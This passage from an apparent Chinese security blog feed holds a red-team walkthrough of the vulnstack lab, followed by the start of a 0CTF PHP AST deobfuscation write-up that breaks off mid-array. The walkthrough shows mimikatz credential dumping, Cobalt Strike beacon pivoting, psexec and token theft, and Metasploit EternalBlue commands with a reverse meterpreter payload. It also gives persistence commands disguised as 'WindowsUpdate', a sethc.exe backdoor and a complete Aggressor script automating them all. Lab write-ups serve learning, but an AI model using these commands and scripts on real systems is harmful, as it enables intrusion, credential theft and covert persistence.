alt="image-20201215144705030"></p><p>使用 <code>mimikatz</code>的<code>logonpasswords</code>读注册表密码</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715409ce079ad5451d68be207.png" alt="image-20201215144849007"></p><p>转到<code>凭证视图</code>可以看到抓取的密码信息</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715402218d46102eb7a56f8a4.png" alt="image-20201215145018039"></p><p>权限不够可打开<code>Elevate</code>进行提权</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715390117d1ec7942bdfa9fd5.png" alt="image-20201215145324355"></p><blockquote><p>额外的提权插件：<a href="https://github.com/rsmudge/ElevateKit">ElevateKit</a>额外增加 <code>ms14-058</code>、<code>ms15-051</code>、<code>ms16-016</code>、<code>uac-schtasks</code> 四种提权方式</p></blockquote><h4 id="fscan内网扫描"><a href="#fscan内网扫描" class="headerlink" title="fscan内网扫描"></a>fscan内网扫描</h4><p>上传 <a href="https://github.com/shadow1ng/fscan/releases/tag/1.6.0">fscan</a>工具进行内网扫描</p><pre><code>fscan.exe -h 192.168.1.1/24</code></pre><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>要想让本地主机连接内网中的主机，我们必须将web服务器作为跳板，这是我们可以让web服务器派生一个<code>Beacon SMB</code></p><blockquote><p>SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效。</p></blockquote><p><code>Beacon SMB</code>具有两种方式</p><p><strong>第一种直接派生一个孩子，目的为了进一步盗取内网主机的 hash</strong></p><p>新建一个 <code>Listener</code>，<code>payload</code> 选择 <code>Beacon SMB</code></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715460b92fb0eb3e0366afbd8.png" alt="image-20201215152442544"></p><p>在已有的Beacon中点击<code>Spawn</code>派生一个新的Beacon</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171540feca1ae092d91c6db23a.png" alt="image-20201215152509529"></p><p>选择我们新建的Beacon SMB</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715466f61f7494e68635ba8e5.png" alt="image-20201215152609142"></p><p>这个时候我们就会派生出一个新的Beacon SMB</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715407b64e1f87325af4417af.png" alt="image-20201215152801722"></p><p>然后我们可以通过<code>link</code>和<code>unlink</code>的命令去连接主机</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20201217154010013ebc045c68b5f336.png" alt="image-20201215153850351"></p><p><strong>第二种在已有的 beacon 上创建监听，用来作为跳板进行内网穿透</strong></p><p>前提是能够通过 shell 之类访问到内网其他主机</p><h4 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h4><p>在之前的探测中我们已经拿到了其他主机的凭证信息，这时候我们可以尝试使用<code>psexec</code>模块登录其他主机</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171540ef2f507b9b5dbe10b8ec.png" alt="image-20201215154123671"></p><p>使用Administrator的凭证进行登录，监听器和会话都选择刚刚的Beacon SMB</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715414cb1d4ed31ee42a0b30b.png" alt="image-20201215154615404"></p><p>可以看到我们已经成功连接到了ROOT-TVI862UBEH</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715413373116e07c2feff747b.png" alt="image-20201215154457704"></p><p>相同操作我们可以拿到OWA域控的主机</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171546864a2231241312976bd4.png" alt="image-20201215155327729"></p><h4 id="token"><a href="#token" class="headerlink" title="token"></a>token</h4><p>除了直接使用获取到的 <code>hash</code> 值，也可以直接窃取 <code>GOD\Administrator</code> 的 <code>Token</code> 来登录其他主机</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20201217154147ed2affb6e1b27e76c6.png" alt="image-20201215155638725"></p><p>在psexec的时候勾选使用目前的access token</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171541bfca180a49bde7c28920.png" alt="image-20201215155751889"></p><p>get it！</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171541e6af90a3ce07d3b249a5.png" alt="image-20201215155933714"></p><h4 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h4><blockquote><p>在CS里使用ladon/ladon_ms17010插件也可以，但是有时候不太稳定，所以这里主要讲如何联动MSF打MS17-010</p></blockquote><p>可以选择派生一个beacon到msf，这个上面介绍到了</p><p>也可以开一个socks4代理</p><p>CS里</p><pre><code class="shell">socks &lt;port&gt;</code></pre><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051013367602817e4ffb459dec55.png" alt="image-20210510004625495" style="zoom:80%;" /><p>MSF里</p><pre><code class="shell">use exploit/windows/smb/ms17_010_eternalblue // 只要存在漏洞就可以打，但是有概率蓝屏use exploit/windows/smb/ms17_010_eternalblue_win8 // 只要存在漏洞就可以打，但是有概率蓝屏use exploit/windows/smb/ms17_010_psexec // 需要目标开启命名管道，并且比较稳定use auxiliary/admin/smb/ms17_010_command // 需要目标开启命名管道，并且比较稳定setg Proxies socks4:&lt;your host&gt;:&lt;port&gt;setg ReverseAllowProxy trueset rhost &lt;victim host&gt;set payload windows/x64/meterpreter/reverse_tcpset lhost &lt;your host&gt;set lport &lt;your port&gt;</code></pre><h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><h4 id="添加隐藏属性"><a href="#添加隐藏属性" class="headerlink" title="添加隐藏属性"></a>添加隐藏属性</h4><p><code>+s</code>是设置系统属性，<code>+h</code>设置隐藏属性，如果需要取消将<code>+</code>换成<code>-</code>即可。</p><pre><code>attrib C:\test.exe +s +h</code></pre><h4 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h4><p><code>/create</code>是创建新任务，<code>/TN</code>是<code>TaskName</code>的简写，也就是新建的任务的名字，在系统必须唯一，<code>/TR</code>是<code>TaskRun</code>的简写，即为需要运行的程序的路径和文件名。<code>/SC</code>是<code>schedule</code>的简写，指定执行的频率的时间单位， <code>/MO</code>是<code>modifier</code>的缩写，可以理解为执行的频率的时间数值。如果任务已经在执行<code>schtasks</code>并不会重复拉起任务。</p><pre><code>schtasks /create /tn WindowsUpdate /tr &quot;C:\test.txt&quot; /sc minute /mo 1</code></pre><p>删除：</p><pre><code>schtasks /delete /tn WindowsUpdate</code></pre><h4 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h4><p>windows系统的开机项位于注册表的：</p><pre><code>\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code></pre><p>新建一个字符串值并修改数值数据为程序路径即可。</p><pre><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d &quot;C:\test.exe&quot; /f</code></pre><h4 id="shift后门"><a href="#shift后门" class="headerlink" title="shift后门"></a>shift后门</h4><p>需要system权限才能实现</p><pre><code># 将所有文件改为仅管理员组(administrators)完全控制takeown /f c:\windows\system32\*.*   /a /r /d ycacls  c:\windows\system32\*.*  /T /E /G administrators:F# 如果提取后是system则使用以下命令cacls  c:\windows\system32\*.*  /T /E /G system:F# 覆盖shift命令copy C:\WINDOWS\system32\cmd.exe​ C:\windows\system32\sethc.exe</code></pre><h4 id="Windows服务"><a href="#Windows服务" class="headerlink" title="Windows服务"></a>Windows服务</h4><p>在windows上系统服务可用SC命令进行增删改。</p><p>需要注意参数值与等号之间要有空格。使用Windows服务进行自启有个很有意思的地方，默认是以<code>system</code>权限启动，也是“提权”的一种不错的方式。另外有个小坑，<code>sc</code>在<code>powershell</code>中传参有问题，执行不成功，必须在<code>cmd</code>里执行。笔者刚开始写插件是全程用<code>bpowershell</code>函数执行命令，在这儿卡了有一会儿，相当难受。</p><pre><code>sc create &quot;WindowsUpdate&quot; binpath= &quot;cmd /c start C:\test.exe&quot;;sc config &quot;WindowsUpdate&quot; start= autonet start WindowsUpdate</code></pre><h4 id="自启目录"><a href="#自启目录" class="headerlink" title="自启目录"></a>自启目录</h4><p>本质上来说和注册表修改是同一个，一个是复制文件，一个是修改注册表。另外，如果用户不是<code>Administrator</code>，目录得改。</p><pre><code>copy &quot;C:\test.exe&quot; &quot;C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe&quot; /yattrib &quot;C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe&quot; +s +h</code></pre><h4 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h4><p>先设置好远控所在的目录，然后执行懒人攻略，重启正常情况下即可弹回四个会话。（一个<code>system</code>，三个<code>admin</code>）</p><pre><code class="json">// PrivilegeHelper.cnapopup beacon_bottom &#123;    menu &quot;权限维持&quot; &#123;        item &quot;设置路径&quot; &#123;            local(&#39;$bid&#39;);            foreach $bid ($1)&#123;                prompt_text(&quot;filePath&quot;, $filePath, &#123;                    $filePath = $1;                    return $filePath;                &#125;);            &#125;        &#125;        item &quot;隐藏文件&quot; &#123;            local(&#39;$bid&#39;);            foreach $bid ($1)&#123;                bshell($1, &quot;attrib \&quot;$filePath\&quot; +s +h&quot;);            &#125;        &#125;        item &quot;定时任务&quot; &#123;            local(&#39;$bid&#39;);            foreach $bid ($1)&#123;                bshell($1, &quot;schtasks /create /tn WindowsUpdate /tr \&quot;$filePath\&quot; /sc minute /mo 1&quot;);            &#125;        &#125;        item &quot;注册表&quot;&#123;            local(&#39;$bid&#39;);            foreach $bid ($1)&#123;                bshell($1, &quot;reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d \&quot;$filePath\&quot; /f&quot;);            &#125;        &#125;        item &quot;SC服务&quot;&#123;            local(&#39;$bid&#39;);            foreach $bid ($1)&#123;                bshell($1, &quot;sc create \&quot;WindowsUpdate\&quot; binpath= \&quot;cmd /c start \&quot;$filePath\&quot;\&quot;&amp;&amp;sc config \&quot;WindowsUpdate\&quot; start= auto&amp;&amp;net start WindowsUpdate&quot;);            &#125;        &#125;        item &quot;shift启动&quot;&#123;            local(&#39;$bid&#39;);            foreach $bid ($1)&#123;                bshell($1, &quot;takeown /f C:\\windows\\system32\\sethc.* /a /r /d y&amp;&amp;cacls C:\\windows\\system32\\sethc.exe /T /E /G system:F&amp;&amp;copy \&quot;$filePath\&quot; C:\\windows\\system32\\sethc.exe /y&quot;);            &#125;        &#125;        item &quot;自启动目录&quot;&#123;            local(&#39;$bid&#39;);            foreach $bid ($1)&#123;                bshell($1, &quot;copy \&quot;$filePath\&quot; \&quot;C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.exe\&quot; /y&quot;);                bshell($1, &quot;attrib \&quot;C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.exe\&quot; +s +h&quot;);            &#125;        &#125;        item &quot;懒人攻略&quot; &#123;            local(&#39;$bid&#39;);            foreach $bid ($1)&#123;                bshell($1, &quot;attrib \&quot;$filePath\&quot; +s +h&quot;);                bshell($1, &quot;schtasks /create /tn WindowsUpdate /tr \&quot;$filePath\&quot; /sc minute /mo 1&quot;);                bshell($1, &quot;reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d \&quot;$filePath\&quot; /f&quot;);                bshell($1, &quot;sc create \&quot;WindowsUpdate\&quot; binpath= \&quot;cmd /c start \&quot;$filePath\&quot;\&quot;&amp;&amp;sc config \&quot;WindowsUpdate\&quot; start= auto&amp;&amp;net start WindowsUpdate&quot;);                bshell($1, &quot;takeown /f C:\\windows\\system32\\sethc.* /a /r /d y&amp;&amp;cacls C:\\windows\\system32\\sethc.exe /T /E /G system:F&amp;&amp;copy \&quot;$filePath\&quot; C:\\windows\\system32\\sethc.exe /y&quot;);                bshell($1, &quot;copy \&quot;$filePath\&quot; \&quot;C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.exe\&quot; /y&quot;);                bshell($1, &quot;attrib \&quot;C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.exe\&quot; +s +h&quot;);            &#125;        &#125;    &#125;&#125;</code></pre><p>## </p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="findstr"><a href="#findstr" class="headerlink" title="findstr"></a>findstr</h3><p>帮助命令</p><pre><code>findstr /?</code></pre><p>查找含某个字符串的文件</p><pre><code>findstr /NI /C:&quot;hello world&quot; demo.txt</code></pre><p>查找含某个字符串的文件名</p><pre><code>findstr /MSI &quot;netingcn.com&quot; *.txt</code></pre><p>常用</p><pre><code>findstr /s /i /m /c:&quot;password&quot; *.txt</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://v0w.top/2020/07/19/vulnstack1">红日安全vulnstack-ATT&amp;CK实战系列 红队实战（一）</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU5MjMwNDYxNw==&mid=2247483876&idx=1&sn=1c716ca9937a6af819229070247cae7a">域渗透笔记-信息收集（一）</a></p><p><a href="https://xz.aliyun.com/t/5881">初探CobaltStrike权限维持及其自动化</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 0CTF Unlimited</title>
      <link href="/2020/09/29/2020-0CTF-Unlimited/"/>
      <url>/2020/09/29/2020-0CTF-Unlimited/</url>
      
        <content type="html"><![CDATA[<blockquote><p>PHP AST + 反混淆 + 矩阵快速幂</p></blockquote><p>唯一带有Web特征的逆向题</p><span id="more"></span><p><a href="https://mega.nz/file/uJ4HgQTK#xq0vn5txVQ7kgroD5x4b3kpd87-fKviU8_Cuwvb7pAc">题目</a>是一个经过混淆的PHP抽象语法树文件，请点击题目下载</p><p>一开始想直接找抽象语法树（AST）转为PHP代码的函数，找到了<a href="https://github.com/nikic/PHP-Parser/blob/master/doc/component/Pretty_printing.markdown">pretty_printing</a>，但是尝试许久，无法直接将AST初始化</p><h3 id="JsonDecoder"><a href="#JsonDecoder" class="headerlink" title="JsonDecoder"></a>JsonDecoder</h3><p>继续查资料看到PHP-Parser可以将json字符串和AST进行互转</p><p><a href="https://github.com/nikic/PHP-Parser/blob/master/lib/PhpParser/JsonDecoder.php">https://github.com/nikic/PHP-Parser/blob/master/lib/PhpParser/JsonDecoder.php</a></p><p>AST转json脚本如下</p><pre><code class="php">&lt;?phprequire dirname(__FILE__).&#39;/vendor/autoload.php&#39;;use PhpParser\Error;use PhpParser\ParserFactory;use PhpParser\PrettyPrinter;use PhpParser\NodeDumper;$code = &lt;&lt;&lt;&#39;CODE&#39;&lt;?phpfunction printLine($msg) &#123;    echo $msg;&#125;CODE;// PHP转化为AST再转化为Json$parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);try &#123;    // PHP =&gt; AST    $ast = $parser-&gt;parse($code);    $dumper = new NodeDumper;    echo $dumper-&gt;dump($ast) . &quot;\n&quot;;    // AST =&gt; Json    $json = json_encode($ast, JSON_PRETTY_PRINT);    echo $json, &quot;\n&quot;;&#125; catch (PhpParser\Error $e) &#123;    echo &#39;Parse Error: &#39;, $e-&gt;getMessage();&#125;// Json转化为AST再转化为PHP$json = file_get_contents(&quot;3.json&quot;);// $json = &lt;&lt;&lt;&#39;CODE&#39;// ]// CODE;// Json =&gt; AST$jsonDecoder = new PhpParser\JsonDecoder();$ast = $jsonDecoder-&gt;decode($json);// AST =&gt; PHP$parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);$prettyPrinter = new PrettyPrinter\Standard;$code = $prettyPrinter-&gt;prettyPrint($ast);echo $code, &quot;\n&quot;;</code></pre><p>其中json字符串如下</p><pre><code class="json">[    &#123;        &quot;nodeType&quot;: &quot;Stmt_Function&quot;,        &quot;byRef&quot;: false,        &quot;name&quot;: &#123;            &quot;nodeType&quot;: &quot;Identifier&quot;,            &quot;name&quot;: &quot;printLine&quot;        &#125;,        &quot;params&quot;: [            &#123;                &quot;nodeType&quot;: &quot;Param&quot;,                &quot;type&quot;: null,                &quot;byRef&quot;: false,                &quot;variadic&quot;: false,                &quot;var&quot;: &#123;                    &quot;nodeType&quot;: &quot;Expr_Variable&quot;,                    &quot;name&quot;: &quot;msg&quot;,                    &quot;attributes&quot;: &#123;                        &quot;startLine&quot;: 3,                        &quot;endLine&quot;: 3                    &#125;                &#125;,                &quot;default&quot;: null,                &quot;flags&quot;: 0,                &quot;attrGroups&quot;: []            &#125;        ],        &quot;returnType&quot;: null,        &quot;stmts&quot;: [            &#123;                &quot;nodeType&quot;: &quot;Stmt_Echo&quot;,                &quot;exprs&quot;: [                    &#123;                        &quot;nodeType&quot;: &quot;Expr_Variable&quot;,                        &quot;name&quot;: &quot;msg&quot;                    &#125;                ]            &#125;        ],        &quot;attrGroups&quot;: []    &#125;]</code></pre><p>AST如下</p><pre><code class="json">array(    0: Stmt_Function(        attrGroups: array(        )        byRef: false        name: Identifier(            name: printLine        )        params: array(            0: Param(                attrGroups: array(                )                flags: 0                type: null                byRef: false                variadic: false                var: Expr_Variable(                    name: msg                )                default: null            )        )        returnType: null        stmts: array(            0: Stmt_Echo(                exprs: array(                    0: Expr_Variable(                        name: msg                    )                )            )        )    ))</code></pre><p>根据上面的例子，我们可以观察到要把AST转为Json需要进行以下处理：</p><ol><li>将<code>array(...)</code>转换为<code>[...]</code></li><li>将<code>Stmt_Function(...)</code> 转化为<code>&#123;&quot;nodeType&quot;: &quot;Stmt_Function&quot;, ...&#125;</code></li><li>对于全部字符串要加上引号</li><li>在<code>&quot;nodeType&quot;</code>后面添加<code>&quot;attributes&quot;: &#123;&#125;</code>属性 </li></ol><p>这里给出一个AST转Json的脚本</p><pre><code class="python">import redata = open(&quot;output.txt&quot;, &quot;r&quot;).readlines()out = open(&quot;4.json&quot;, &quot;w&quot;)lines = len(data)brackets = []for line in range(lines):    tmp = data[line].strip(&quot;\n&quot;)    # 检测 array    res1 = re.findall(r&quot;array\(&quot;, tmp)    if res1:        brackets.append(&quot;]&quot;)        tmp = tmp.replace(&quot;array(&quot;, &quot;[&quot;)    # 检测 class    res2 = re.findall(r&quot;(\w+)\(&quot;, tmp)    if res2:        brackets.append(&quot;&#125;&quot;)        tmp = tmp.replace(res2[0] + &quot;(&quot;, &quot;&#123;nodeType: %s, attributes: &#123;&#125;&quot; % res2[0])    # 删除多余标签    res3 = re.findall(r&quot;(\d+: )&quot;, tmp)    if res3:        tmp = tmp.replace(res3[0], &#39;&#39;)    # 添加引号    res4 = re.findall(r&quot;(flag\&#123;| \&#125;|[\w\-]+)&quot;, tmp)    if res4:        for word in res4:            if not (word.isdigit() or word == &quot;null&quot; or word == &quot;true&quot; or word == &quot;false&quot;):                if word == &quot; &#125;&quot;:                    word = &quot;&#125;&quot;                tmp = tmp.replace(word, &#39;&quot;%s&quot;&#39; % word)    # 匹配右括号    if &quot;)&quot; in tmp:        tmp = tmp.replace(&quot;)&quot;, brackets.pop())    # 添加逗号    if ((line + 1) &lt; lines) and (not &quot;)&quot; in data[line + 1]) and (not &quot;[&quot; in tmp):        tmp = tmp + &quot;,&quot;     # 写进文件    out.write(tmp + &quot;\n&quot;)out.close()</code></pre><p>最后再用上面的pretty_printing代码转出一份稍微好看点的混淆过的PHP代码</p><pre><code class="php">&lt;?php $l1IIl1II1l = function ($lII1lI1IlI) &#123;    return function ($II1IlllI11) use($lII1lI1IlI) &#123;        return function ($ll1IlllIIl) use($II1IlllI11, $lII1lI1IlI) &#123;            return $II1IlllI11($lII1lI1IlI($II1IlllI11)($ll1IlllIIl));        &#125;;    &#125;;&#125;;$llIIllIlll = function ($lII1lI1IlI) &#123;    return $lII1lI1IlI + 1;&#125;;$I1lll111II = function ($lIlIll1111) &#123;    return function ($II1IIl1Ill) use($lIlIll1111) &#123;        return function ($II1IlllI11) use($lIlIll1111, $II1IIl1Ill) &#123;            return function ($ll1IlllIIl) use($II1IlllI11, $lIlIll1111, $II1IIl1Ill) &#123;                return $lIlIll1111($II1IlllI11)($II1IIl1Ill($II1IlllI11)($ll1IlllIIl));            &#125;;        &#125;;    &#125;;&#125;;$I1II11lIl1 = function ($lII1lI1IlI) &#123;    return $lII1lI1IlI - 1;&#125;;$I1IIlII1Il = function ($II1IlllI11) &#123;    return function ($ll1IlllIIl) &#123;        return $ll1IlllIIl;    &#125;;&#125;;$IIl1II1lIl = function ($lII1lI1IlI) &#123;    return $lII1lI1IlI * 3 % 7;&#125;;$I1IllI1l11 = function ($lIlIll1111) use($I1lll111II, $I1IIlII1Il) &#123;    return function ($II1IIl1Ill) use($lIlIll1111, $I1lll111II, $I1IIlII1Il) &#123;        return $lIlIll1111($I1lll111II($II1IIl1Ill))($I1IIlII1Il);    &#125;;&#125;;$l1I11lll1l = function ($II1IlllI11) &#123;    return function ($ll1IlllIIl) use($II1IlllI11) &#123;        return $II1IlllI11($ll1IlllIIl);    &#125;;&#125;;$lIl1l1lIlI = function ($lII1lI1IlI) &#123;    return ($lII1lI1IlI + 1) % 1000000007;&#125;;$l1llIlll1l = array(array($I1lll111II($l1IIl1II1l($I1lll111II($I1lll111II($l1I11lll1l)($I1lll111II($l1I11lll1l)($I1lll111II($l1IIl1II1l($l1I11lll1l))($l1I11lll1l))))($l1I11lll1l)))($l1I11lll1l), $I1lll111II($I1lll111II($l1I11lll1l)($l1IIl1II1l($l1IIl1II1l($l1I11lll1l))))($I1lll111II($l1I11lll1l)($I1lll111II($l1IIl1II1l($l1I11lll1l))($I1lll111II($l1I11lll1l)($l1I11lll1l)))), $l1IIl1II1l($I1lll111II($I1lll111II($l1IIl1II1l($I1lll111II($l1I11lll1l)($I1lll111II($I1lll111II($l1I11lll1l)($I1lll111II($l1I11lll1l)($l1I11lll1l)))($l1I11lll1l))))($l1I11lll1l))($l1I11lll1l)), $I1IllI1l11($l1IIl1II1l($l1I11lll1l))($l1IIl1II1l($l1I11lll1l)), $I1IIlII1Il, $I1IllI1l11($l1IIl1II1l($l1I11lll1l))($I1lll111II($l1I11lll1l)($l1IIl1II1l($l1IIl1II1l($l1I11lll1l)))), $I1lll111II($l1IIl1II1l($l1I11lll1l))($I1lll111II($l1I11lll1l)($I1IllI1l11($I1lll111II($l1I11lll1l)($l1I11lll1l))($l1IIl1II1l($I1lll111II($l1I11lll1l)($l1I11lll1l))))), $l1IIl1II1l($l1IIl1II1l($I1lll111II($l1I11lll1l)($I1lll111II($l1I11lll1l)($l1I11lll1l)))), $I1lll111II($l1I11lll1l)($I1lll111II($l1I11lll1l)($l1I11lll1l))), array($I1lll111II($I1lll111II($l1I11lll1l)($I1lll111II($l1I11lll1l)($l1I11lll1l)))($I1lll111II($l1I11lll1l)($I1lll111II($I1lll111II($l1I11lll1l)($I1lll111II($l1I11lll1l)($l1I11lll1l)))($l1I11lll1l))), $I1IIlII1Il, $l1IIl1II1l($l1IIl1II1l($l1I11lll1l)), $I1lll111II($I1lll111II($I1IllI1l11($I1lll111II($l1IIl1II1l($l1I11lll1l))($l1I11lll1l))($I1lll111II($l1I11lll1l)($l1I11lll1l)))($l1I11lll1l))($l1I11lll1l), $I1IIlII1Il, $l1IIl1II1l($I1lll111II($I1lll111II($l1I11lll1l)($l1I11lll1l))($l1IIl1II1l($l1I11lll1l))), $I1lll111II($I1lll111II($I1lll111II($I1lll111II($l1I11lll1l)($l1IIl1II1l($l1I11lll1l)))($I1lll111II($l1I11lll1l)($l1I11lll1l)))($l1I11lll1l))($I1lll111II($l1I11lll1l)($l1IIl1II1l($l1I11lll1l))), $I1lll111II($I1lll111II($l1I11lll1l)($I1lll111II($l1I11lll1l)($l1I11lll1l)))($I1lll111II($I1lll111II($l1IIl1II1l($l1I11lll1l))($I1lll111II($l1I11lll1l)($l1I11lll1l)))($I1lll111II($l1I11lll1l)($l1I11lll1l))), $I1IllI1l11($l1IIl1II1l($l1I11lll1l))($I1lll111II($l1I11lll1l)($I1lll111II($l1I11lll1l)($l1IIl1II1l($l1I11lll1l))))), array($I1lll111II($I1lll111II($l1I11lll1l)($l1I11lll1l))($l1I11lll1l), $l1IIl1II1l($l1I11lll1l), $I1IIlII1Il, $l1IIl1II1l($I1lll111II($I1IllI1l11($l1IIl1II1l($l1I11lll1l))($I1lll111II($l1I11lll1l)($I1lll111II($l1I11lll1l)($l1I11lll1l))))($l1I11lll1l)), $I1lll111II($l1I11lll1l)($l1I11lll1l), $I1lll111II($l1I11lll1l)($I1lll111II($l1IIl1II1l($I1lll111II($l1I11lll1l)($I1lll111II($l1I11lll1l)($l1I11lll1l))))($l1I11lll1l)), $I1IIlII1Il, $l1I11lll1l, $I1lll111II($l1I11lll1l)($I1lll111II($I1lll111II($I1lll111II($l1I11lll1l)($l1IIl1II1l($l1I11lll1l)))($I1lll111II($l1I11lll1l)($I1lll111II($l1I11lll1l)($l1I11lll1l))))($l1IIl1II1l($l1I11lll1l)))), array($l1IIl1II1l($I1lll111II($I1lll111II($l1IIl1II1l($I1lll111II($l1I11lll1l)($l1I11lll1l)))($l1IIl1II1l($I1lll111II($l1I11lll1l)($l1I11lll1l))))($I1lll111II($l1I11lll1l)($l1I11lll1l))), $I1lll111II($l1IIl1II1l($I1lll111II($I1lll111II($l1I11lll1l)($l1I11lll1l))($l1I11lll1l)))($l1IIl1II1l($I1lll111II($l1I11lll1l)($l1I11lll1l))), $l1IIl1II1l($l1IIl1II1l($l1I11lll1l)), $I1lll111II($l1I11lll1l)($l1I11lll1l), $l1I11lll1l, $I1IIlII1Il, $I1lll111II($l1I11lll1l)($I1IllI1l11($I1lll111II($l1I11lll1l)($l1I11lll1l))($I1lll111II($l1I11lll1l)($l1I11lll1l))), $I1lll111II($l1IIl1II1l($I1IllI1l11($I1lll111II($I1lll111II($l1I11lll1l)($l1I11lll1l))($l1I11lll1l))($I1lll111II($l1I11lll1l)($l1I11lll1l))))($I1lll111II($l1I11lll1l)($l1I11lll1l)), $I1lll111II($I1lll111II($I1lll111II($l1I11lll1l)($I1lll111II($l1I11lll1l)($l1I11lll1l)))($I1lll111II($I1lll111II($l1IIl1II1l($l1I11lll1l))($l1I11lll1l))($l1I11lll1l)))($I1lll111II($l1I11lll1l)($l1I11lll1l))), array($I1lll111II($I1lll111II($I1lll111II($l1I11lll1l)($l1I11lll1l))($l1I11lll1l))($I1lll111II($l1I11lll1l)($I1lll111II($I1lll111II($l1I11lll1l)($l1I11lll1l))($I1lll111II($l1I11lll1l)($l1I11lll1l)))), $I1lll111II($I1lll111II($l1I11lll1l)($l1IIl1II1l($I1lll111II($l1I11lll1l)($l1IIl1II1l($l1I11lll1l)))))($I1lll111II($l1I11lll1l)($l1IIl1II1l($l1I11lll1l))), $I1IllI1l11($I1lll111II($l1IIl1II1l($l1I11lll1l))($l1I11lll1l))($I1lll111II($l1IIl1II1l($l1I11lll1l))($l1I11lll1l)), $I1lll111II($l1I11lll1l)($I1lll111II($l1I11lll1l)($I1lll111II($l1I11lll1l)($l1I11lll1l))), $I1IIlII1Il, $I1lll111II($l1IIl1II1l($l1I11lll1l))($l1I11lll1l), $I1lll111II($I1lll111II($l1I11lll1l)($l1IIl1II1l($l1IIl1II1l($l1I11lll1l))))($l1I11lll1l), $l1I11lll1l, $I1lll111II($l1I11lll1l)($I1lll111II($I1lll111II($l1I11lll1l)($l1I11lll1l))($I1lll111II($l1I11lll1l)($l1I11lll1l)))), array($I1lll111II($l1I11lll1l)($l1I11lll1l), $l1IIl1II1l($I1lll111II($l1IIl1II1l($l1I11lll1l))($I1IllI1l11($I1lll111II($l1IIl1II1l($l1I11lll1l))($l1I11lll1l))($l1IIl1II1l($l1I11lll1l)))), $l1IIl1II1l($l1I11lll1l), $I1IIlII1Il, $I1lll111II($I1IllI1l11($l1IIl1II1l($l1I11lll1l))($l1IIl1II1l($l1I11lll1l)))($I1lll111II($I1lll111II($l1I11lll1l)($l1I11lll1l))($I1lll111II($I1lll111II($l1I11lll1l)($l1I11lll1l))($l1I11lll1l))), $I1lll111II($I1lll111II($l1I11lll1l)($l1I11lll1l))($l1IIl1II1l($I1lll111II($l1I11lll1l)($l1IIl1II1l($I1lll111II($l1I11lll1l)($l1I11lll1l))))), $I1lll111II($I1lll111II($I1lll111II($l1IIl1II1l($l1I11lll1l))($l1I11lll1l))($l1I11lll1l))($l1I11lll1l), $I1IIlII1Il, $I1lll111II($l1IIl1II1l($l1IIl1II1l($I1lll111II($l1IIl1II1l($I1lll111II($l1I11lll1l)($l1IIl1II1l($l1I11lll1l))))($l1I11lll1l))))($l1I11lll1l)), array($I1IIlII1Il, 